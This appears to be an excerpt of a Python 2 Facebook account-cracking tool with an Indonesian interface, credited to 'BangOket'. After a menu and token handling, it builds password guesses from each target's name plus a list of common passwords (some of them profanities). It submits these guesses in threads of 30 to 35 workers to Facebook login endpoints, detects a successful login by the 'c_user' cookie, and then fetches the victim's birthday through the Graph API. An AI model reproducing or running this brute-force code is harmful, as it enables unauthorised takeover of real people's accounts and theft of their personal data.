...
%s -(           I      I  %s@@%s\\
  \         /'.____.'\___|    %s╔╦╗╔╗ ╔═╗%s
   '-.....-' __/ | \   (`)    %s║║║╠╩╗╠╣%s
            /   /  /          %s╩ ╩╚═╝╚%s
                \  \ %s
\033[0m|| Created By BangOket
\033[0m|| Github.com/Bangkeet
...
def login():
    ...
    print banner
    print("\033[0;96m"+50*"-")
    print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Login With Email & Pass (\033[1;36mRawanKenaCheckPoint\033[1;37m)'
...
def menu():
  ...
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Version      : \033[1;32mpremium 1.0")
  ...
  if r=="":print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] isi Yang Benar").format(R,N);menu()
      ...
      exit(emailerendem.emaileclone())# Sengaja Gua Pisah Biar Nggak Ngesetuck
  elif r=="6":
      exit(arawangy.tetearakecil())# Sengaja Gua Pisah Biar Nggak Ngesetuck
  elif r=="7":
      ress()
  elif r=="8":
      syngara()
    ...
    print ("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] SALAH BANG!").format(R,N);menu()
...
def hek_target():
	global toket
	try:
		toket=open('___bismillah___').read()
	except IOError:
...
def wordlist(): #~~~MASIH DI UPDATE
	try:
		...
		print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie Invalid"
		os.system('rm -rf ___bismillah___')
		login()
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
...
def publik():
    try:
        toket = open('bismillah').read()
    except IOError:
        os.system('rm -rf ___bismillah__')
        time.sleep(0.01)
        os.sys.exit()
...
def dekura_x():
	...
	print ''
	Bangkeet = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ")
	if Bangkeet == "":
		menu()
	elif Bangkeet == "1":
		...
		if bukanmaen == "m":
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						Bangkeet = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=2:
						Bangkeet = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=3:
						Bangkeet = [ name, name+"123", name+"12345", name+"123456" ]
					else:
						Bangkeet = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "rahasia", "katasandi", "kontol", "bajingan", "indonesia", "sayangkamu" ]
					coeg.submit(api, uid, asu)
			exit(mbf.awokawokaowkwoawk())
			...
			with ThreadPoolExecutor(max_workers=35) as coeg:
				...
				for user in id:
					...
					if len(name)>=6:
						...
						Bangkeet = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "rahasia", "katasandi", "kontol", "bajingan", "indonesia", "sayangkamu" ]
					coeg.submit(mbasic, uid, asu)
			exit(mbf.awokawokaowkwoawkwowksheheheiwoansvdejeike_dekura_sayang())
...
def mbasic(uid, asu):
	...
	for pw in Bangkeet:
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			try:
				token = open("___bismillah___").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
